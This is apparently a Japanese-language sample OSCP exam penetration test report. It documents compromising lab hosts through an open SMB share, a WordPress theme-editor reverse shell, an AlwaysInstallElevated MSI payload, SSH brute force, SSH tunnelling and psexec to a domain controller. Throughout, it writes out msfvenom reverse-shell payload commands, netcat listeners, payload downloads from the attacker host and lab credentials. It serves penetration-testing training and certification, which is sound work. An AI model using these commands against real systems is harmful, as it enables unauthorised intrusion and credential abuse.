OSCP Penetration Test Report

v.2.0

student@youremailaddress.com

OSID: XXXXX

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image.png)

Copyright © 2023 OffSec Ltd. All rights reserved.

この出版物のいかなる部分も、その全部または一部を複製、コピー、譲渡、または著作権所有者に留保するその他の権利(コピーおよびその他すべてのコピー、ネットワークまたはその他の通信手段を使用した転送または送信、遠隔学習のための放送を含む)を、情報ストレージなどのいかなる形式または手段によっても、 OffSecからの事前の書面による許可なしに、送信または検索システム。

[1. OffSec OSCP Exam Penetration Test Report    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_gjdgxs)

[1.1 Introduction    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_30j0zll)

[1.2 Objective    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1fob9te)

[1.3 Requirements    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3znysh7)

[2. High-Level Summary    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2et92p0)

[2.1 Recommendations    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_tyjcwt)

[3. Methodologies    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3dy6vkm)

[3.1 Information Gathering    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1t3h5sf)

[3.2 Service Enumeration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4d34og8)

[3.3 Penetration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2s8eyo1)

[3.4 Maintaining Access    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_17dp8vu)

[3.5 House Cleaning    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3rdcrjn)

[4. Independent Challenges    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_26in1rg)

[4.1 Target #1 – 192.168.232.55    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_lnxbz9)

[4.1.1 Service Enumeration    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_35nkun2)

[4.1.2 Initial Access – Anonymous SMB share leads to Wordpress RCE    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ksv4uv)

[5. Active Directory Set    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_44sinio)

[5.1 Ajla – 10.4.4.10    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2jxsxqh)

[5.1.1 Initial Access – Password Brute-Forcing    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_z337ya)

[5.1.2 Privilege Escalation – Sudo group    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3j2qqm3)

[5.1.3 Post-Exploitation    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1y810tw)

[5.2 Poultry – 10.5.5.20    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4i7ojhp)

[5.2.1 Initial Access – RDP login    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2xcytpi)

[5.2.2 Post-Exploitation    24](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ci93xb)

[5.3 DC – 10.5.5.30    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2bn6wsx)

[5.3.1 Initial Access – Remote Commands Execution    25](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_qsh70q)

[5.3.2 Post-Exploitation    26](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1pxezwc)

1\. OffSec OSCP 試験ペネトレーション テスト レポート

1.1 はじめに

OffSec ラボと試験のペネトレーション テスト レポートには、OffSec コースに合格するために実施されたすべての取り組みが含まれています。このレポートには、試験全体に合格するために使用されたすべての項目が含まれている必要があり、試験のあらゆる側面に対する正確性と充実度の観点から採点されます。このレポートの目的は、学生がペネトレーションテストの方法論を完全に理解し、OffSec認定プロフェッショナルの資格に合格するための技術的知識を持っていることを確認することです。

1.2 目的

この評価の目的は、OffSec Lab and Exam ネットワークに対して内部侵入テストを実行することです。学生は、客観的な目標へのアクセスを得るために系統的なアプローチに従うことを任務としています。このテストでは、実際の侵入テストと、レポート全体を含む最初から最後までの方法を効果的にシミュレートする必要があります。このドキュメントの後半部分には、このコースに合格することが期待されるものに関する十分な情報を提供するサンプルページがすでに作成されています。サンプル レポートをガイドラインとして使用して、レポート作成を進めます。

1.3 必要条件

受講者は、このペネトレーションテストレポートに完全に記入し、次のセクションを含める必要があります。

·全体的な概要と推奨事項 (非技術系)

·方法論のウォークスルーと実行された手順の詳細な概要

·各検出結果には、スクリーンショット、ウォークスルー、サンプルコード、および該当する場合はproof.txtが含まれています。

·含まれていなかった追加アイテム

2\. ハイレベルなまとめ

John Doeは、OffSec Labsに対して内部侵入テストを実施する任務を負いました。内部ペネトレーションテストは、内部接続されたシステムに対する専用の攻撃です。このテストの焦点は、ハッカーと同様の攻撃を実行し、OffSecの内部ラボシステム(THINC.localドメイン)への侵入を試みることです。ジョンの全体的な目的は、ネットワークを評価し、システムを特定し、欠陥を悪用し、その結果をOffSecに報告することでした。

内部ペネトレーションテストを実施したところ、OffSecのネットワークにいくつかの憂慮すべき脆弱性が特定されました。攻撃を実行する際、ジョンは複数のマシンにアクセスできましたが、これは主に古いパッチと貧弱なセキュリティ構成が原因でした。 テスト中、ジョンは複数のシステムに対する管理レベルのアクセス権を持っていました。すべてのシステムが悪用され、アクセスが許可されました。

2.1 推奨事項

Johnは、テスト中に特定された脆弱性にパッチを適用して、攻撃者が今後これらのシステムを悪用できないようにすることを推奨しています。覚えておくべきことの1つは、これらのシステムには頻繁なパッチ適用が必要であり、パッチが適用された後は、後日発見された追加の脆弱性を保護するために、定期的なパッチプログラムを維持する必要があるということです。

3\. メソドロジー

ジョンは、OffSecラボと試験環境がどの程度安全であるかをテストするのに効果的な侵入テストを実行するために広く採用されているアプローチを利用しました。以下は、Johnがさまざまなシステムを特定して悪用する方法の概要であり、見つかった個々の脆弱性をすべて含んでいます。

3.1 情報収集

ペネトレーションテストの情報収集部分では、ペネトレーションテストの範囲を特定することに重点が置かれます。このペネトレーションテストでは、ジョンはラボと試験ネットワークを悪用する任務を負いました。具体的なIPアドレスは次のとおりです。

試験ネットワーク:

192.168.232.55, 172.16.203.134, 172.16.203.135, 172.16.203.136

3.2 サービスの列挙

ペネトレーションテストのサービス列挙部分では、システム上でどのサービスが稼働しているかに関する情報を収集することに重点が置かれています。これは、システムへの潜在的な攻撃ベクトルに関する詳細な情報を提供するため、攻撃者にとって価値があります。システムで実行されているアプリケーションを理解することで、攻撃者は実際の侵入テストを実行する前に必要な情報を得ることができます。 場合によっては、一部のポートがリストされないことがあります。

3.3 浸透

評価のペネトレーションテストの部分では、さまざまなシステムへのアクセスに重点が置かれています。このペネトレーションテストで、ジョンは50のシステムのうち10のシステムにアクセスすることに成功しました。

3.4 アクセスの維持

システムへのアクセスを維持することは、攻撃者である私たちにとって重要であり、悪用されたシステムに戻れるようにすることは非常に貴重です。ペネトレーションテストのアクセス維持フェーズでは、集中的な攻撃(バッファオーバーフローなど)が発生した後、システムに対する管理アクセスが再び得られるようにすることに重点を置いています。多くのエクスプロイトは一度しかエクスプロイトできない可能性があり、エクスプロイトを実行した後はシステムに戻ることができない場合があります。

John は、侵害されたすべてのシステムに管理者とルートレベルのアカウントを追加しました。管理/ルートアクセスに加えて、追加のアクセスを確立できるように、Metasploit meterpreterサービスがマシンにインストールされました。

3.5 ハウスクリーニング

評価のハウスクリーニング部分では、侵入テストの残骸が確実に除去されます。多くの場合、ツールやユーザー アカウントの断片が組織のコンピューターに残されており、将来的にセキュリティ上の問題を引き起こす可能性があります。細心の注意を払い、ペネトレーションテストの残骸が残らないようにすることが重要です。

ラボネットワークと試験ネットワークの両方のトロフィーが完成した後、ジョンはすべてのユーザーアカウントとパスワード、およびシステムにインストールされているMeterpreterサービスを削除しました。OffSec では、システムからユーザー アカウントやサービスを削除する必要はありません。

4\. 自主的な課題

4.1ターゲット#1– 192.168.232.55

4.1.1 初期アクセス – 匿名のSMB共有がWordpressのRCEにつながる

脆弱性の説明: SMBサーバーはパスワードで保護されておらず、資格情報などの機密情報が保存されています。これは、ワードプレスのテーマエディタからRCEにつながります。

脆弱性の修正: SMB は資格情報を使用して構成し、ゲスト列挙を無効にする必要があります。

重大度: クリティカル

攻撃を再現する手順: 最初のサービス スキャンを実行しました。 John は、このホストが Sehnzi と呼ばれていることを発見しました。Smbclientは、ポート445で対話してSMB共有shenziからpasswords.txtファイルを取得するために使用され、それらの資格情報をワードプレス管理者アクセスに使用しました。

4.1.2 サービス列挙

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
| 192.168.232.55 | **TCP**: 21, 80, 135, 139, 443, 3306, 49666 |

nmapを実行してターゲットをスキャンし、いくつかのポートが開いていることがわかりました。

==🔴└─$ nmap 192.168.232.55 -p- --min-rate 20000==

==🔴Starting Nmap 7.93 (== ==🔴https://nmap.org== ==🔴) at 2023-11-17 10:28 +04==

==🔴Warning: 192.168.232.55 giving up on port because retransmission cap hit (10).==

==🔴Nmap scan report for 192.168.232.55==

==🔴Host is up (0.27s latency).==

==🔴Not shown: 48865 filtered tcp ports (no-response), 16662 closed tcp ports (conn-refused)==

==🔴PORT      STATE SERVICE==

==🔴21/tcp    open  ftp==

==🔴80/tcp    open  http==

==🔴135/tcp   open  msrpc==

==🔴139/tcp   open  netbios-ssn==

==🔴443/tcp   open  https==

==🔴445/tcp   open  microsoft-ds==

==🔴3306/tcp  open  mysql==

==🔴49665/tcp open  unknown==

==🔴Nmap done: 1 IP address (1 host up) scanned in 173.20 seconds==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%201.png)

==🔴└─$ nmap -sCV 192.168.232.55==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%202.png)

4.1.2 初期アクセス – Wordpress RCE への SMB 共有

SMBは、パスワードで保護されておらず、興味深いファイルを持っている「Shenzi」共有をrevleadします。

==🔴└─$ smbclient -L== ==🔴\\\\192.168.232.55==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%203.png)

==🔴└─$ smbclient== ==🔴\\\\192.168.232.55\\shenzi==

==🔴Password for \[WORKGROUP\kali\]:==

==🔴Try "help" to get a list of possible commands.==

==🔴smb: \> ls==

==🔴.                                   D        0  Thu May 28 19:45:09 2020==

==🔴..                                  D        0  Thu May 28 19:45:09 2020==

==🔴passwords.txt                A     894  Thu May 28 19:45:09 2020==

==🔴readme_en.txt               A   7367  Thu May 28 19:45:09 2020==

==🔴sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 19:45:09 2020==

==🔴why.tmp                        A      213  Thu May 28 19:45:09 2020==

==🔴xampp-control.ini           A      178  Thu May 28 19:45:09 2020==

==🔴12941823 blocks of size 4096. 5850488 blocks available==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%204.png)

Shenzi共有にはpasswords.txtファイルがあり、ワードプレスの管理者アカウントでのログインに使用できるファイルをダウンロードします。

==🔴└─$ smb: \> get passwords.txt==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%205.png)

==🔴└─$ cat passwords.txt==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%206.png)

すべてのパスワードadminから:FeltHeadwallWight357は面白そうに見えますが、一般的な単語リストを使用して列挙するディレクトリで興味深いディレクトリを見つけることができませんでしたが、共有名を使用する場合は、ワードプレスのサイトを楽しませてくれます。

==🔴└─$== ==🔴http://192.168.232.55/shenzi/==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%207.png)

最初に検出された資格情報 admin:FeltHeadwallWight357 を SMB 共有から使用して、ワードプレスにログインしました。

==🔴└─$== ==🔴http://192.168.232.55/shenzi/wp-login.php==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%208.png)

ログインに成功したら、\[外観\]-\[>テーマエディター\]-\[>テーマTwenty Twenty\]に移動して、アクティブなWebサイトのテーマを決定します。.phpページ(404.phpなど)を選択すると、ページのソースコードを直接編集できることがわかります。

==🔴http://192.168.232.55/shenzi/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%209.png)

MSFでメータープリッターペイロードを生成し、それを使用して404.phpコードを更新してRCEを取得しました。

==🔴└─$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.45.154 lport=443 -f raw > shell.php==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2010.png)

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2011.png)

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2012.png)

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2013.png)

404.phpファイルを更新した後、http://192.168.232.55/shenzi/wp-content/themes/twentytwenty/404.php にアクセスしてリバースシェルを実行し、multi/handlerを使用してそれをキャッチします。

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2014.png)

一方、Metasploitコンソールでは、次のようになります。

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2015.png)

PHPのリバースシェルはやや不安定なので、より安定したシェルをアップロードし、msfvenomで生成し、meterpreterを使用してアップロードしましょう。

==🔴└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=139 -f exe > shell.exe==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2016.png)

Kali攻撃マシンの場合:

==🔴└─$ sudo nc -lvp 139==

On Meterpreter session:

==🔴meterpreter > upload shell.exe==

==🔴meterpreter > execute -f shell.exe==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2017.png)

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2018.png)

Local.txt値:

==🔴└─$ whoami && ipconfig && type local.txt==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2019.png)

4.1.3 特権エスカレーション - Always Install Elevated

PowerUp.ps1 を使用して簡単にぶら下がっている果実を確認したところ、システムが AlwaysInstallElevated に対して脆弱であることがわかりました。Microsoftが述べたように、このオプションは完全な管理者権限を付与することと同等であり、重大なセキュリティリスクをもたらす可能性があります。マイクロソフトでは、この設定の使用を強くお勧めしません。

- https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
- https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated

==🔴└─$ python -m http.server 80==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2020.png)

==🔴└─$ iwr== ==🔴http://192.168.45.154/PowerUp.ps1== ==🔴-o PowerUp.ps1==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2021.png)

PowerUp.ps1 スクリプトを PowerShell に読み込み、簡単に実現できるものがないか確認します。

==🔴PS C:\Users\shenzi\Desktop> . .\PowerUp.ps1==

==🔴PS C:\Users\shenzi\Desktop> Invoke-AllChecks==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2022.png)

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2023.png)

この脆弱性は、Microsoftが提案している手動コマンドを使用して確認することもできます。

URL: https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated

==🔴PS C:\Users\shenzi\Desktop>== ==🔴reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer==

==🔴reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer==

==🔴HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer==

==🔴AlwaysInstallElevated    REG_DWORD    0x1==

==🔴PS C:\Users\shenzi\Desktop>== ==🔴reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer==

==🔴reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer==

==🔴HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer==

==🔴AlwaysInstallElevated    REG_DWORD    0x1==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2024.png)

ペイロードを生成し.msiそれを転送してターゲットマシンで実行し、昇格されたシェルを取得します。

==🔴└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=445 -f msi > notavirus.msi==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2025.png)

==🔴└─$ python -m http.server 80==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2026.png)

==🔴└─$ iwr== ==🔴http://192.168.45.154/notavirus.msi== ==🔴-o notavirus.msi==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2027.png)

==🔴└─$ PS C:\Users\shenzi\Desktop> msiexec /i notavirus.msi==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2028.png)

==🔴└─$ sudo nc -lvnp 445==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2029.png)

4.1.4 エクスプロイト後の処理

Proof.txt値:

==🔴c:\Users\Administrator\Desktop> whoami && ipconfig && type proof.txt==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2030.png)

- **5. Active Directory Set**

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.4.4.10 | **TCP:** 22, 80 |
| 10.5.5.20 | **TCP:** 135, 139, 445, 3389 |
| 10.5.5.30 | **TCP:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |

5.1 アジュラ – 10.4.4.10

5.1.1 初期アクセス – パスワードのブルートフォース攻撃

脆弱性の説明: Ajlaホストのユーザーアカウントは、ブルートフォース攻撃から5分以内に解読された簡単なパスワードによって保護されていました。

脆弱性の修正: SSHサービスは、パスワードベースのログインを受け入れないように構成する必要があり、ユーザーアカウント自体には、公開されている単語リストに含まれていない一意のパスワードが含まれている必要があります。

重大度: クリティカル

攻撃を再現する手順:最初のサービススキャンで、JohnはこのホストがAjlaと呼ばれることを発見しました。ターゲットの IP を /etc/hosts ファイルに追加した後、Hydra ツールは IP の代わりにマシンの DNS 名を使用して SSH サービスに対して実行されました。抽出したパスワードが手元にあれば、John は SSH を使用して ajla としてログインできました。

==🔴└─$ hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh==

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2031.png)

5.1.2 特権エスカレーション – sudo グループ

脆弱性の説明: sudo group を使用すると、このグループのすべてのユーザーが、ユーザーのパスワードを知っている場合、特権を root に昇格できます。

脆弱性の修正: SSHサービスは、パスワードベースのログインを受け入れないように構成する必要があり、ユーザーアカウント自体には、公開されている単語リストに含まれていない一意のパスワードが含まれている必要があります。

重大度: クリティカル

攻撃を再現する手順: Johnは、ログインして「id」コマンドを使用するとすぐに、ajlaユーザーがsudoグループのメンバーであることを発見しました。また、ユーザーのパスワードを知っているため、ルートシェルを取得するために「sudo su」というコマンドを1つだけ使用するだけで済みました。

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2032.png)

- **5.1.3 Post-Exploitation**

Screenshot of System Proof:

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2033.png)

証明ファイルを収集し、SSH を使用してバックドアを確立した後、John はファイルシステムの列挙を開始し、興味深いファイルの存在を確認しました。彼は、10.5.5.20 IPから発信されたマウントされた共有があることに気付きました。/mnt/scripts ディレクトリ内のカスタム sysreport.ps1 スクリプトを調べると、"sandbox\alex" ユーザーのクリアテキストの資格情報が見つかりました。このディレクトリ内のスクリプトの種類とユーザー名の構造を考慮すると、“Poultry”ホストはActive Directory環境の一部であるようです。

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2034.png)

ジョンは、SSHを使用してリバースダイナミックポートフォワーディングを確立することで、ラテラルムーブメントを開始しました。まず、新しいSSHキーのペアを生成し、それらをKaliVMのauthorized_keysファイルに追加してから、SSHポート転送コマンドを1つ発行するだけで済みました。

==🔴└─$== ==🔴ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key==

==🔴└─$== ==🔴ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key== [==🔴kali@192.168.119.164==](mailto:kali@192.168.119.164)

動的逆方向トンネルが確立されると、John はポート 1080 を使用するように /etc/proxychains.conf を編集するだけで済みました。

- **5.2 Poultry – 10.5.5.20**
- 5.2.1 初期アクセス – RDP ログイン

攻撃を再現する手順:資格情報が手元にあり、逆方向トンネルが確立された状態で、Johnはプロキシチェーンを使用してRDPセッションに接続し、プロンプトが表示されたら証明書を受け入れ、その後取得したパスワードを入力します。

==🔴└─$== ==🔴proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard==

- **5.2.2 Post-Exploitation**

**Local Proof Screenshot:**

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2035.png)

John はユーザーのデスクトップに Thunderbird プログラムがあることに気付き、Alex の受信トレイをチェックしているときに、ローカル管理者の Roger からのメールを見つけました。

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2036.png)

**5.3 DC – 10.5.5.30**

5.3.1 初期アクセス – リモートコマンドの実行

攻撃を再現する手順: John は、管理者が Alex に残した一時パスワードを再利用することができました。

==🔴└─$== ==🔴proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:==[==🔴UWyBGeTp3Bhw7f@10.5.5.30==](mailto:UWyBGeTp3Bhw7f@10.5.5.30)

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image%2037.png)

- **5.3.2 Post-Exploitation**

**System Proof Screenshot:**

![](assets/images/Report%20Format-%E4%BE%8B(%E6%97%A5%E6%9C%AC%E8%AA%9E%EF%BC%89%20image.jpg)